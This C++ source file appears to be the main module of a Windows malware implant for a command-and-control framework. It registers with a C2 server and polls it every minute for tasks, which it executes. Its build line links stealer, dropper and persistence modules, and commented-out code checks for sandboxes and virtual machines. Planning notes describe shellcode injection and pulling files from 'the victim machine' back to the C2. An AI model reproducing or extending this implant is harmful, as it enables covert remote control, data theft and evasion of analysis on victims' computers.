#include "implant.h"
// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   
/*
Notes: GatherInfo - 
[Currently has Computer name, username, and privileges]
Read the environment variables
● List the computer’s network interfaces
    ○  MAC, IPs, interface names…etc
● Get the windows version
● Get the current username and token
● Get the Machine GUID
● List files in a directory
● Change Directory
● List all running processes 
*/

/* To Implement:
A way to have the binary only run 3
(If someone clicks it 100 times - only shell)

The encryption that we had
*/

/* Double Check with Ingi -
Can the table be for get_commands [ I think args is not in there] 

Deleted args - Ingi 
            { "task_id": 12,
            "target_implant_id": 1,
            "command": "whoami",
            "created_on": "dec 01",
            "status": "done"}

 */

/*
This was under execution - idk what it is
Process Injection: support execution of shellcode in either a
remote processes (by pid) or via fork & run

Execution: Payload format
-> Is this the dropper

Implant->File I/O
The implant should be able to
1) Read files from the victim machine and send it back to the C2.
2) Download files from the C2 and write them to disk either
**encrypted**, or **unencrypted**.
*/

/* Note to self sort of:
C2->Database->Implants
Implant ID: Create an ID for the implant to distinguish is from others
Computer Name: What computer did it connect from?
Username: What user are you running as?
GUID: What is the computer's GUID?
Integrity: What privileges do you have?
Connecting IP address: what address did it connect from?
Session Key: After you negotiated a session key, store it per agent
Sleep: How often does the agent check in?
Jitter: How random of a check in is it?
First Seen: When did the agent first check in?
Last Seen: When was the the last time you saw the agent?
Expected Check in: When should you expect to see the agent again?
*/

void IWillRunForever(void){
    while(true){
        /* THIS IS GETTING US COMMANDS EVERY MINUTE */
        std::string new_item = HttpGetCommand("/get_qcommands", IMPLANT_ID);
        
        json converted_new_item = json::parse(new_item);
        int num_of_tasks = converted_new_item.size();
        for(int i = 0; i < num_of_tasks; i++){
            /* Only execute commands that are untouched */
            std::string command = converted_new_item.at(i).at(2);
            std::string args = converted_new_item.at(i).at(3);
            execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
        }
        Sleep(60000);
    }
}

void registerimplant(void){
    std::string jitter = std::to_string(5);
    std::string sleep = std::to_string(60000);
    HttpRegisterImplant("/register_implant", jitter, sleep);
    return;
}

int main(int argc, char* argv[]){

    /* Registering Implant */
    registerimplant();

    /* HOW ARE WE GETTING IMPLANT ID?*/

    /* Sandbox Detection */
    printf("Executing Sandbox Detection\n");
    // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
    //     exit(0);
    // }
    
    /* Receive Tasks, Execute Tasks, Send Back Tasks */
    IWillRunForever();

    return 0;
}